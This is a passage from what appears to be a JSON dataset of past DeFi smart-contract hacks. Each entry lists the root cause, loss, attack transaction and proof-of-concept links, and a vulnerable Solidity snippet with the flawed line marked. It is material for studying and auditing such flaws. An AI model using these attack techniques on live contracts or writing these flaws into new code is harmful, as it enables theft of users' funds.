        "root_cause": "Insufficient validation. It doesn't check the validity of the Jars. Attacker can create fake token to withdraw all DAIs from StrategyCmpdDaiV2 to Jar.",
        "attack_tx": null,
        "analysis": "it doesn't check the validity of the Jars. Attacker can create fake token to withdraw all DAIs from StrategyCmpdDaiV2 to Jar.",
        "vulnerable_code_snippet": "function swapExactJarForJar(\n        address _fromJar, // From which Jar\n        address _toJar, // To which Jar\n        uint256 _fromJarAmount, // How much jar tokens to swap\n        uint256 _toJarMinAmount, // How much jar tokens you'd like at a minimum\n        address payable[] calldata _targets,\n        bytes[] calldata _data\n    ) external returns (uint256) {\n        require(_targets.length == _data.length, \"!length\");\n\n        // Only return last response\n        for (uint256 i = 0; i < _targets.length; i++) {\n            require(_targets[i] != address(0), \"!converter\");\n            require(approvedJarConverters[_targets[i]], \"!converter\");\n        }\n\n        address _fromJarToken = IJar(_fromJar).token();\n        address _toJarToken = IJar(_toJar).token();\n\n        // Get pTokens from msg.sender\n        IERC20(_fromJar).safeTransferFrom(\n            msg.sender,\n            address(this),\n            _fromJarAmount\n        );\n\n        // Calculate how much underlying\n        // is the amount of pTokens worth\n        uint256 _fromJarUnderlyingAmount = _fromJarAmount\n            .mul(IJar(_fromJar).getRatio())\n            .div(10**uint256(IJar(_fromJar).decimals()));\n\n        // Call 'withdrawForSwap' on Jar's current strategy if Jar\n        // doesn't have enough initial capital.\n        // This has moves the funds from the strategy to the Jar's\n        // 'earnable' amount. Enabling 'free' withdrawals\n        uint256 _fromJarAvailUnderlying = IERC20(_fromJarToken).balanceOf(\n            _fromJar\n        );\n        if (_fromJarAvailUnderlying < _fromJarUnderlyingAmount) {\n            IStrategy(strategies[_fromJarToken]).withdrawForSwap(\n                _fromJarUnderlyingAmount.sub(_fromJarAvailUnderlying)\n            );\n        }\n\n        // Withdraw from Jar\n        // Note: this is free since its still within the \"earnable\" amount\n        //       as we transferred the access\n        IERC20(_fromJar).safeApprove(_fromJar, 0);\n        IERC20(_fromJar).safeApprove(_fromJar, _fromJarAmount);\n        IJar(_fromJar).withdraw(_fromJarAmount); //vulnerable point\n\n        // Calculate fee\n        uint256 _fromUnderlyingBalance = IERC20(_fromJarToken).balanceOf(\n            address(this)\n        );\n        uint256 _convenienceFee = _fromUnderlyingBalance.mul(convenienceFee).div(\n            convenienceFeeMax\n        );\n\n        if (_convenienceFee > 1) {\n            IERC20(_fromJarToken).safeTransfer(devfund, _convenienceFee.div(2));\n            IERC20(_fromJarToken).safeTransfer(treasury, _convenienceFee.div(2));\n        }\n\n        // Executes sequence of logic\n        for (uint256 i = 0; i < _targets.length; i++) {\n            _execute(_targets[i], _data[i]);\n        }\n\n        // Deposit into new Jar\n        uint256 _toBal = IERC20(_toJarToken).balanceOf(address(this));\n        IERC20(_toJarToken).safeApprove(_toJar, 0);\n        IERC20(_toJarToken).safeApprove(_toJar, _toBal);\n        IJar(_toJar).deposit(_toBal);\n\n        // Send Jar Tokens to user\n        uint256 _toJarBal = IJar(_toJar).balanceOf(address(this));\n        if (_toJarBal < _toJarMinAmount) {\n            revert(\"!min-jar-amount\");\n        }\n\n        IJar(_toJar).transfer(msg.sender, _toJarBal);\n\n        return _toJarBal;\n    }"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240606",
        "title": "MineSTM",
        "root_cause": "Incorrect uses reserve of pair for liquidity calculation. There's 'sell' function in 'MineSTM' contract, and it uses reserve of pair for liquidity calculation. Hacker manipulated reserve amount by swapping large amount of tokens, and then called 'sell' function to get lots of tokens.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0x849ed7f687cc2ebd1f7c4bed0849893e829a74f512b7f4a18aea39a3ef4d83b1",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/MineSTM_exp.sol",
        "vulnerable_code": "function sell(uint256 amount) external { eve_token_erc20.transferFrom(msg.sender, address(this), amount); (, uint256 r1, ) = inner_pair.getReserves(); <-- vulnerable point uint256 lpAmount = amount*inner_pair.totalSupply()/(2*r1); uniswapV2Router.removeLiquidity(address(usdt_token_erc20),address(eve_token_erc20),lpAmount,0,0,msg.sender,block.timestamp); }",
        "analysis": "https://x.com/0xNickLFranklin/status/1798920774511898862"
    },
    {
        "type": "Access Control, Reward",
        "date": "20231106",
        "title": "TrustPad",
        "root_cause": "The function `receiveUpPool` has no access control or `msg.sender` validation, as a result, it could be called by anyone to manipulate the `newlockstartTime`. By repeatedly calling `receiveUpPool` and `withdraw` , the attacker could keep claiming rewards. Function receiveUpPool: Here `msg.sender` could be different from `account`.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x191a34e6c0780c3d1ab5c9bc04948e231d742b7d88e0e4f85568d57fcdc03182",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/TrustPad_exp.sol",
        "analysis": "https://twitter.com/BeosinAlert/status/1721800306101793188",
        "Lost": "$155K",
        "vulnerable_code_snippet": "function receiveUpPool(address account, uint256 amount) external {\n        require(account != address(0), 'Must specify valid account');\n        require(amount > 0, 'Must specify non-zero amount');\n\n        UserInfo storage user = userInfo[account];\n\n        // Re-lock (using old date if already locked)\n        // With lock start == block.timestamp, rewardDebt will be reset to 0 - marking the new locking period rewards countup.\n        uint256 newLockStartTime;\n        if (isLocked(account)) {\n            newLockStartTime = depositLockStart[account];\n        } else {\n            newLockStartTime = LaunchpadLockableStaking(msg.sender).isLocked(account)\n                ? LaunchpadLockableStaking(msg.sender).depositLockStart(account)\n                : block.timestamp;\n        }\n        updateDepositLockStart(account, newLockStartTime);\n        emit Locked(account, amount, lockPeriod, 0);\n        ...\n    }"
    },
    {
        "type": "Access Control",
        "date": "20200618",
        "title": "Bancor Protocol",
        "root_cause": "Incorrect access control",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20200618-bancor-protocol---access-control",
        "analysis": "Incorrect access control in the `safeTransferFrom` function allowed attackers to transfer funds.",
        "vulnerable_code_snippet": "function safeTransferFrom(IERC20Token _token, address _from, address _to, uint256 _value) public { \n       execute(_token, abi.encodeWithSelector(TRANSFER_FROM_FUNC_SELECTOR, _from, _to, _value));\n    }",
        "fixed_code": "function safeTransferFrom(IERC20Token _token, address _from, address _to, uint256 _value) internal { \n       execute(_token, abi.encodeWithSelector(TRANSFER_FROM_FUNC_SELECTOR, _from, _to, _value));\n    }",
        "lost": "$545,000",
        "fixed": true
    },
    {
        "type": "Access Control, lending",
        "date": "20220415",
        "title": "Rikkei Finance",
        "root_cause": "Incorrect access control. SetOracleData() function whose visibility is public and can be called externally. Anyone can call SetOracleData to manipulate price.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220415-rikkei-finance---access-control--price-oracle-manipulation",
        "analysis": "SetOracleData() function whose visibility is public and can be called externally. Anyone can call SetOracleData to manipulate price.\n\n```solidity\nfunction setOracleData(address rToken, oracleChainlink _oracle) external { //vulnerable point\n        oracleData[rToken] = _oracle;\n    }\n```",
        "lost": "$1.1 M",
        "vulnerable_code_snippet": "function setOracleData(address rToken, oracleChainlink _oracle) external { //vulnerable point\n        oracleData[rToken] = _oracle;\n    }"
    },
    {
        "type": "Access Control",
        "date": "20230620",
        "title": "MIMSpell",
        "root_cause": "A vulnerability was exploited in the swap() function of ZeroXStargateLPSwapper contract where the attacker could swap the USDT owned by that contract to MIM tokens in which the recipient is the attacker - by calling zeroXEchangeProxy.call(swapData) with a swapData that does that.",
        "attack_tx": "https://etherscan.io/tx/0x2c9f87e285026601a2c8903cf5f10e5b3655fbd0264490c41514ce073c42a9c3",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/MIMSpell_exp.sol",
        "analysis": "https://twitter.com/hexagate_/status/1671188024607100928?cxt=HHwWgMC--e2poLEuAAAA",
        "vulnerable_code_snippet": "function swap(\n    address,\n    address,\n    address recipient,\n    uint256 shareToMin,\n    uint256 shareFrom,\n    bytes calldata swapData\n) public override returns (uint256 extraShare, uint256 shareReturned) {\n    bentoBox.withdraw(IERC20(address(pool)), address(this), address(this), 0, shareFrom);\n\n    // use the full balance so it's easier to check if everything has been redeemed.\n    uint256 amount = IERC20(address(pool)).balanceOf(address(this));\n\n    // Stargate Pool LP -> Underlying Token\n    stargateRouter.instantRedeemLocal(poolId, amount, address(this));\n    require(IERC20(address(pool)).balanceOf(address(this)) == 0, \"Cannot fully redeem\");\n\n    // underlying -> MIM\n    (bool success, ) = zeroXExchangeProxy.call(swapData);\n    if (!success) {\n        revert ErrSwapFailed();\n    }\n\n    (, shareReturned) = bentoBox.deposit(mim, address(this), recipient, mim.balanceOf(address(this)), 0);\n    extraShare = shareReturned - shareToMin;\n}"

    },
    {
        "type": "Dex/AMM, Flashloans, lending",
        "date": "20220928",
        "lost": "$40,305",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220928-bxh---flashloan--price-oracle-manipulation",
        "title": "BXH",
        "root_cause": "Incorrect Reward calculation. Incorrect use of getReserves() to get amount of balance in the pool to calculate bonus via getAmountOut()",
        "vulnerable_code_snippet": "function getITokenBonusAmount(uint256 _pid, uint256 _amountInToken) public view returns (uint256) {\n    PoolInfo storage pool = poolInfo[_pid];\n\n    (uint112 _reserve0, uint112 _reserve1, ) = IUniswapV2Pair(pool.swapPairAddress).getReserves(); //vulnerable point\n    uint256 amountTokenOut = 0;\n    uint256 _fee = 0;\n    if (IUniswapV2Pair(pool.swapPairAddress).token0() == address(iToken)) {\n        amountTokenOut = getAmountOut(_amountInToken, _reserve0, _reserve1, _fee); //vulnerable point\n    } else {\n        amountTokenOut = getAmountOut(_amountInToken, _reserve1, _reserve0, _fee); //vulnerable point\n    }\n    return amountTokenOut;\n}\n\nfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut, uint256 feeFactor) private pure returns (uint) {\n    require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');\n    require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n\n    uint256 feeBase = 10000;\n\n    uint amountInWithFee = amountIn.mul(feeBase.sub(feeFactor));\n    uint numerator = amountInWithFee.mul(reserveOut);\n    uint denominator = reserveIn.mul(feeBase).add(amountInWithFee);\n    uint amountOut = numerator / denominator;\n    return amountOut;\n}"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240313",
        "lost": "13k USDT",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/IT_exp.sol",
        "title": "IT",
        "root_cause": "In 'transfer' function, if sender is pair address(buy IT token), IT tokens are minted to pair in 'mintToPoolIfNeeded' function. Hacker exploited this.Also to make 'mintAmount' bigger, he transferred 2000 USDT into pair. ",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/bsc/0xb33057f57ce451aa8cbb65508d298fe3c627509cc64a394736dace2671b6dcfa",
        "analysis": "https://twitter.com/0xNickLFranklin/status/1768171595561046489",
        "vulnerable_code_snippet": "function transfer(address sender, address recipient, uint256 amount) internal {\n    require(sender != address(0), \"BEP20: transfer from the zero address\");\n    require(recipient != address(0), \"BEP20: transfer to the zero address\");\n    require(isActivated[sender], \"Sender is not activated\");\n\n    // rule 1-2\n    require(address(exchange) == address(0) || recipient == address(exchange) || !isPancakeSwapPool(recipient),\n    // rule 5\n    require(address(exchange) == address(0) || ((!isContract(sender) || allowedContracts[sender]) && (!isContract(sender)));\n    // rule 4\n    require(address(exchange) == address(0) || totallyUnlockedAddresses[sender] || _totallyUnlockedAddresses[recipient]);\n\n    if (!isActivated[recipient]) {\n        isActivated[recipient] = true;\n    }\n\n    if (_firstBuyRates[recipient] == 0) {\n        _firstBuyRates[recipient] = getUsdtRate();\n    }\n\n    if (address(exchange) == sender) {\n        if (exchange.totalSupply() >= _lastExchangeTotalSupply) {\n            updateCurrMaxUsdtRateNeeded();\n            _makeReferralUnlocksIfNeeded(recipient, amount);\n            mintToPoolIfNeeded(amount);\n            _mint(_owner, amount.div(20));\n        }\n    }\n\n    if (address(exchange) != address(0)) {\n        _lastExchangeTotalSupply = exchange.totalSupply();\n    }\n\n    require(amount <= availableBalanceOf(sender), \"BEP20: transfer amount exceeds available balance\");\n} ... function mintToPoolIfNeeded(uint256 amount) internal {\n    if (address(exchange) == address(0)) {\n        return;\n    }\n\n    uint256 tokenUsdtRate;\n    (uint112 reserve0, uint112 reserve1, ) = exchange.getReserves();\n\n    uint256 tokenReserve;\n    uint256 usdtReserve;\n\n    if (address(this) == exchange.token0()) {\n        tokenReserve = uint256(reserve0);\n        usdtReserve = uint256(reserve1);\n    } else {\n        tokenReserve = uint256(reserve1);\n        usdtReserve = uint256(reserve0);\n    }\n\n    tokenUsdtRate = uint256(usdtReserve).mul(PRECISION).div(uint256(tokenReserve));\n\n    // uint256 k = tokenReserve.mul(usdtReserve);\n\n    uint256 tokenReserveAfterBuy = tokenReserve - amount;\n    // uint256 usdtReserveAfterBuy = k.div(tokenReserveAfterBuy);\n    uint256 usdtReserveAfterBuy = tokenReserve.mul(usdtReserve).div(tokenReserveAfterBuy);\n\n    uint256 maxTokenUsdtRateAfterBuy = tokenUsdtRate.add(tokenUsdtRate.div(100));\n    if (tokenReserveAfterBuy >= tokenMinReserveAfterBuy) {\n        mintAmount = amount.div(2);\n    } else {\n        mintAmount = this.max(tokenMinReserveAfterBuy.sub(tokenReserveAfterBuy), amount.div(2));\n    }\n\n    mint(address(exchange), mintAmount);\n}"
    },
    {
        "type": "Weak RNG",
        "date": "20240527",
        "title": "RedKeysCoin",
        "root_cause": "Due to weak RNG, we can estimate bet result by calculating the result of the function randomNumber",
        "attack_tx": "https://bscscan.com/tx/0x8d5fb97b35b830f8addcf31c8e0c6135f15bbc2163d891a3701ada0ad654d427",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/RedKeysCoin_exp.sol",
        "analysis": "https://x.com/SlowMist_Team/status/1794975336192438494",
        "vulnerable_code_snippet": "function randomNumber() internal view returns (uint256) { \n    uint256 seed = uint256( \n        keccak256( \n            abi.encodePacked( \n                counter + \n                    block.timestamp + \n                    block.prevrandao + \n                    (( \n                        uint256(keccak256(abi.encodePacked(block.coinbase))) \n                    ) / (block.timestamp)) + \n                    block.gaslimit + \n                    ((uint256(keccak256(abi.encodePacked(msg.sender)))) / \n                        (block.timestamp)) + \n                    block.number \n            ) \n        ) \n    ); \n\n    return (seed - ((seed / 1000) * 1000)); \n}",
        "affected_contract": "0x71e3056aa4985de9f5441f079e6c74454a3c95f0",
        "loss": "$12K"
    },
    {
        "type": "Deflationary token, ERC20, Token-Transfer",
        "date": "20230118",
        "title": "QTN",
        "root_cause": "Blocksec: QTN token has an inflation mechanism: all QTN holders' balanceOf will increase for each QTN's sale in Uniswap. However, the QTN's developer uses `from == UniswapPair` to judge if there is a QTN's sale. The incorrect condition is the root cause of this attack.\n\nUniswap pair has a function named\nskim that can cheat QTN, so the attack contract increases his QTN's balance via 3 steps: 1) transfer x QTN to Uniswap pair; 2) invoke the skim function to a created contract; 3) transfer y QTN back to the attack contract (y > x).",
        "attack_tx": [
            "https://etherscan.io/tx/0x37cb8626e45f0749296ef080acb218e5ccc7efb2ae4d39c952566dc378ca1c4c",
            "https://etherscan.io/tx/0xfde10ad92566f369b23ed5135289630b7a6453887c77088794552c2a3d1ce8b7"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/QTN_exp.sol",
        "analysis": "https://twitter.com/BlockSecTeam/status/1615625901739511809",
        "vulnerable_code_snippet": "function balanceOf(address account) public view override returns (uint256) {\n        if(account == uniswapV2Pair)\n            return uniswapV2PairAmount;\n        return _gonBalances[account].div(_gonsPerFragment); //vulnerable point\n    }\n\nfunction rebasePlus(uint256 _amount) private {\n         _totalSupply = _totalSupply.add(_amount.div(5));\n        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);\n    }\n\nfunction _transfer(address from, address to, uint256 amount) private {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"ERC20: Transfer amount must be greater than zero\");\n        \n        if (from != owner() && to != owner()) {\n            uint256 txLimitAmount = _totalSupply.mul(_percentForTxLimit).div(100);\n            \n            require(amount <= txLimitAmount, \"ERC20: amount exceeds the max tx limit.\");\n            \n            if(from != uniswapV2Pair) { //vulnerable point\n                require(!blacklist[from] && !blacklist[to], 'ERC20: the transaction was blocked.');\n                require(_buyInfo[from] == 0 || _buyInfo[from].add(_timeLimitFromLastBuy) < now, \"ERC20: Tx not allowed yet.\");\n                \n                if(to != address(uniswapV2Router) && to != uniswapV2Pair)\n                    _tokenTransfer(from, to, amount, 0);\n                else\n                    _tokenTransfer(from, to, amount, 0);\n            }\n            else {\n                if(!_live)\n                    blacklist[to] = true;\n                \n                require(balanceOf(to) <= txLimitAmount, 'ERC20: current balance exceeds the max limit.');\n                \n                _buyInfo[to] = now;\n                _tokenTransfer(from, to, amount, 0);\n\n                uint256 rebaseLimitAmount = _totalSupply.mul(_percentForRebase).div(100);\n                uint256 currentBalance = balanceOf(to);\n                uint256 newBalance = currentBalance.add(amount);\n                if(currentBalance < rebaseLimitAmount && newBalance < rebaseLimitAmount) {\n                    rebasePlus(amount);\n                }\n            }\n        } else {\n            _tokenTransfer(from, to, amount, 0);\n        }\n    }"
    },
    {
        "type": "Deflationary token, Flashloans",
        "date": "20220424",
        "lost": "78 BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220424-wiener-doge---flashloan",
        "title": "Wiener DOGE",
        "root_cause": "LPs should be excluded from fees and token burns. if an LP sends 100 WDOGE, its balance will decrease by 104 WDOGE, attacker exhaust the deflationary tokens in the LP pair; LPs should be excluded from fees and token burns.",
        "vulnerable_code_snippet": "function _transfer(address sender, address recipient, uint256 amount) internal virtual returns (bool) {\n        require(_balances[sender].amount >= amount, \"ERC20: transfer amount exceeds balance\");\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        if(block.timestamp >=  openingTime && block.timestamp <= closingTime)\n        {\n            _balances[sender].amount -= amount;\n            _balances[recipient].amount += amount;\n            emit Transfer(sender, recipient, amount);\n        }\n        else\n        {\n            uint256 onePercent = findOnePercent(amount);\n            uint256 tokensToBurn = onePercent *4;   // deflationary\n            uint256 tokensToRedistribute = onePercent * 4;\n            uint256 toFeeWallet = onePercent*1;\n            uint256 todev = onePercent* 1;\n            uint256 tokensToTransfer = amount - tokensToBurn - tokensToRedistribute - toFeeWallet-todev;\n\n            _balances[sender].amount -= amount;\n            _balances[recipient].amount += tokensToTransfer;\n            _balances[feeWallet].amount += toFeeWallet;\n            _balances[dev].amount  += todev;\n            if (!_balances[recipient].exists){\n                _balanceOwners.push(recipient);\n                _balances[recipient].exists = true;\n            }\n\n            redistribute(sender, tokensToRedistribute);\n            _burn(sender, tokensToBurn);  // burn\n            emit Transfer(sender, recipient, tokensToTransfer);\n        }\n        return true;\n    }"
    },
    {
        "type": "Insufficient validation",
        "date": "20230821",
        "lost": "$15K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/EHIVE_exp.sol",
        "title": "EHIVE",
        "root_cause": "The attacker exploited a validation flaw between the stake and unstake functions. They created a position by staking nothing, waited 38 days, then took a WETH loan, swapped it to EHIVE, and sent it to initial contracts. By unstaking across all contracts, they received more WETH despite not having staked anything initially.",
        "attack_tx": "https://etherscan.io/tx/0xad818ec910def08c70ac519ab0fffa084b4178014a91cd8aa2f882d972a511c1",
        "analysis": "https://twitter.com/bulu4477/status/1693636187485872583",
        "vulnerable_code_snippet":"function stake(uint256 stakeAmount, uint256 validator) external isStakingEnabled {\n        require(totalSupply() <= maxSupply, \"There are no more rewards left to be claimed.\");\n\n        // Check user is registered as staker\n        if (isStaking(msg.sender, validator)) {\n            _stakers[msg.sender][validator].staked += stakeAmount;\n            _stakers[msg.sender][validator].earned += _userEarned(msg.sender, validator);\n            _stakers[msg.sender][validator].start = block.timestamp;\n        } else {\n            _stakers[msg.sender][validator] = Staker(msg.sender, block.timestamp, stakeAmount, 0);\n        }\n\n        validators[validator].staked += stakeAmount;\n        totalStaked += stakeAmount;\n        _burn(msg.sender, stakeAmount);\n    }\n...\nfunction unstake(uint256 validator) external {\n        require(isStaking(msg.sender, validator), \"You are not staking!?\");\n\n        uint256 reward = userEarned(msg.sender, validator);\n\n        if (totalSupply().add(reward) < maxSupply && stakingEnabled) {\n            _claimHistory[msg.sender].dates.push(block.timestamp);\n            _claimHistory[msg.sender].amounts.push(reward);\n            totalClaimed += reward;\n\n            _mint(msg.sender, _stakers[msg.sender][validator].staked.add(reward));\n        } else {\n            _mint(msg.sender, _stakers[msg.sender][validator].staked);\n        }\n\n        validators[validator].staked -= _stakers[msg.sender][validator].staked;\n        totalStaked -= _stakers[msg.sender][validator].staked;\n\n        delete _stakers[msg.sender][validator];\n    }"
    },
    {
        "type": "Flashloans",
        "date": "20230623",
        "Lost": "997 WBNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/SHIDO_exp.sol",
        "Title": "SHIDO",
        "root_cause": "The attacker took advantage of the lock and claim mechanism, as well as the price difference between the two pools.",
        "attack_tx": "https://bscscan.com/tx/0x72f8dd2bcfe2c9fbf0d933678170417802ac8a0d8995ff9a56bfbabe3aa712d6",
        "analysis": "https://x.com/Phalcon_xyz/status/1672473343734480896"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20231222",
        "title": "PineProtocol",
        "root_cause": "Due to the shared pools between two different contracts. This shared pool address between the old and new contract versions led to the execution of fund transfers originating from the same address but targeting different pools. The attacker initiated the process by using NFT tokens as collateral to borrow assets from the new version of the pool. Subsequently, they executed another flash loan from the old version of the pool, utilizing it to repay their initially borrowed assets.",
        "attack_tx": [
            "https://explorer.phalcon.xyz/tx/eth/0x2f328016764ecf1f57fda0f5490087a5ddba83706b51cf518bdbd7e65ae2383b",
            "https://explorer.phalcon.xyz/tx/eth/0xf4f254c3c6b64ded778b5af292c6ab6ed886c1bdd8988510bdc0ca0cf7f9857e",
            "https://explorer.phalcon.xyz/tx/eth/0xec7523660f8b66d9e4a5931d97ad8b30acc679c973b20038ba4c15d4336b393d"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/PineProtocol_exp.sol",
        "analysis": [
            "https://medium.com/neptune-mutual/analysis-of-the-pine-protocol-exploit-e09dbcb80ca0",
            "https://blog.solidityscan.com/pine-protocol-hack-analysis-7ce8621f444b"
        ] 
    },
    {
        "type": "ERC20, Flashloans, Reward",
        "date": "20220908",
        "title": "NewFreeDAO",
        "root_cause": "Incorrect reward calculation. Reward calcuates by the caller's NFD token balance and transfers the reward to caller.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220908-newfreedao---flashloans-attack",
        "analysis": "Reward calcuates by the caller's NFD token balance and transfers the reward to caller.\n\n```solidity\nfunction 0x6811e3b9() public nonPayable { \n    require(_isAirAddr.code.size);\n    v0, v1 = _isAirAddr.balanceOf(msg.sender).gas(msg.gas);\n    require(v0);\n    require(RETURNDATASIZE() >= 32);\n    require(v1 > 0, 'Amount can not be Zero');\nif (owner_d[msg.sender] <= 0) {\n        owner_d[msg.sender] = stor_6;\n    }\nv2 = _SafeDiv(stor_8, block.timestamp - owner_d[msg.sender]);\n    require(v2 > 0, 'The collection time was not reached');\nv3 = v4 = 0;\nif (block.timestamp > stor_7) { //vulnerable point\n        if (v2 > 0) {\n            v5 = 0x3182(stor_b, v1);\n            v3 = v6 = _SafeDiv(0xf4240, v5);\n        }\n    } else if (v2 > 0) { //vulnerable point\n        v7 = 0x3182(stor_b, v1);\n        v8 = 0x3182(v2, v7);\n        v3 = v9 = _SafeDiv(0xf4240, v8);\n    }\n    require(_isAirAddr.code.size);\n    v10, v11 = _isAirAddr.transfer(msg.sender, v3).gas(msg.gas);\n    require(v10);\n    require(RETURNDATASIZE() >= 32);\n    owner_d[msg.sender] = block.timestamp;\n}\n```",
        "lost": "$125M",
        "vulnerable_code_snippet": "function 0x6811e3b9() public nonPayable { \n    require(_isAirAddr.code.size);\n    v0, v1 = _isAirAddr.balanceOf(msg.sender).gas(msg.gas);\n    require(v0);\n    require(RETURNDATASIZE() >= 32);\n    require(v1 > 0, 'Amount can not be Zero');\nif (owner_d[msg.sender] <= 0) {\n        owner_d[msg.sender] = stor_6;\n    }\nv2 = _SafeDiv(stor_8, block.timestamp - owner_d[msg.sender]);\n    require(v2 > 0, 'The collection time was not reached');\nv3 = v4 = 0;\nif (block.timestamp > stor_7) { //vulnerable point\n        if (v2 > 0) {\n            v5 = 0x3182(stor_b, v1);\n            v3 = v6 = _SafeDiv(0xf4240, v5);\n        }\n    } else if (v2 > 0) { //vulnerable point\n        v7 = 0x3182(stor_b, v1);\n        v8 = 0x3182(v2, v7);\n        v3 = v9 = _SafeDiv(0xf4240, v8);\n    }\n    require(_isAirAddr.code.size);\n    v10, v11 = _isAirAddr.transfer(msg.sender, v3).gas(msg.gas);\n    require(v10);\n    require(RETURNDATASIZE() >= 32);\n    owner_d[msg.sender] = block.timestamp;\n}",
        "contract_address": "0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e"
    },
    {
        "type": "Precision Loss",
        "date": "20240215",
        "title": "DualPools",
        "root_cause": "The attacker exploited the low liquidity of the new dualpools pool, which distorted the prices of assets linked to dToken. This enabled them to use a small amount of dTokens to collateralize a large amount of other assets. Then, they took advantage of a precision truncation issue to further manipulate the system",
        "attack_tx": "https://bscscan.com/tx/0x90f374ca33fbd5aaa0d01f5fcf5dee4c7af49a98dc56b47459d8b7ad52ef1e93",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DualPools_exp.sol",
        "analysis": "https://lunaray.medium.com/dualpools-hack-analysis-5209233801fa"
    },
    {
        "type": "Deflationary token",
        "date": "20230419",
        "title": "OLIFE",
        "lost": "32 WBNB",
        "root_cause": "The attacker called the `transfer()` and `deliver()` functions to reduce the number of rSupply and tSupply.\nThe value of rate is thus calculated less, increasing the number of reflected tokens in the pair,  Finally directly call swap to withdraw $WBNB from the pair.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/OLIFE_exp.sol",
        "vulnerable_code": "https://bscscan.com/address/0xb5a0Ce3Acd6eC557d39aFDcbC93B07a1e1a9e3fa#code",
        "attack_tx": "https://bscscan.com/tx/0xa21692ffb561767a74a4cbd1b78ad48151d710efab723b1efa5f1e0147caab0a",
        "analysis": "https://twitter.com/BeosinAlert/status/1648520494516420608",
        "vulnerable_code_snippet": "function deliver(uint256 tAmount) public {\n    address sender = _msgSender();\n    require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n    (uint256 rAmount,,,,,,) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rTotal = _rTotal.sub(rAmount);\n    _tFeeTotal = _tFeeTotal.add(tAmount);\n}"
    },
    {
        "type": "Access Control, Lack of permission control",
        "date": "20230921",
        "title": "CEXISWAP",
        "root_cause": "The `initialize` function is not protected, allowing the attacker to take over the proxy contract and become the owner through the `upgradeToAndCall` method, subsequently stealing all the funds in the contract, transferring all the USDT out of the treasury.",
        "attack_tx": "https://etherscan.io/tx/0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/CEXISWAP_exp.sol",
        "analysis": "https://twitter.com/DecurityHQ/status/1704759560614126030"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240430",
        "title": "Yield",
        "root_cause": "This vulnerability is associated with the burning shares functionality `burn(address to)` of the strategy contract which is responsible for burning the strategy tokens and allowing the user to withdraw the LP tokens.",
        "attack_tx": "https://arbiscan.io/tx/0x6caa65b3fc5c8d4c7104574c3a15cd6208f742f9ada7d81ba027b20473137705",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/Yield_exp.sol",
        "analysis": "https://medium.com/immunefi/yield-protocol-logic-error-bugfix-review-7b86741e6f50",
        "vulnerable_code": "https://arbiscan.io/address/0x3b4ffd93ce5fcf97e61aa8275ec241c76cc01a47",
        "lost": "181K",
        "vulnerable_code_snippet": "function burn(address to) external isState(State.INVESTED)\n    returns (uint256 poolTokensObtained)\n{\n  // Caching\n   IPool pool_ = pool;\n   uint256 poolCached_ = poolCached;\n   uint256 totalSupply_ = _totalSupply;\n\n   // Burn strategy tokens\n   uint256 burnt = _balanceOf[address(this)];\n   _burn(address(this), burnt);\n\n   poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;\n   pool_.safeTransfer(address(to), poolTokensObtained);\n\n   // Update pool cache\n   poolCached = poolCached_ - poolTokensObtained;\n}"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20231213",
        "title": "HYPR",
        "root_cause": "The root cause was that the attacker managed to circumvent the 'finalizeERC20Withdrawal' function check by reinitializing the contract, due to the existence of the 'clearLegacySlot' modifier. The clearLegacySlot modifier here will reset the value of the storage slot 0. This action, in turn, resets the value of storage slot 0 of the Initializable contract (to verify this, we can inspect the inheritance chain of the L1StandardBridge contract). If we read the comments carefully, we'll know that the current version of this code is not ready for production. So, that's the reason why this function can be called multiple times.",
        "attack_tx": [
            "https://www.oklink.com/es-la/eth/tx/0x51ce3d9cfc85c1f6a532b908bb2debb16c7569eb8b76effe614016aac6635f65",
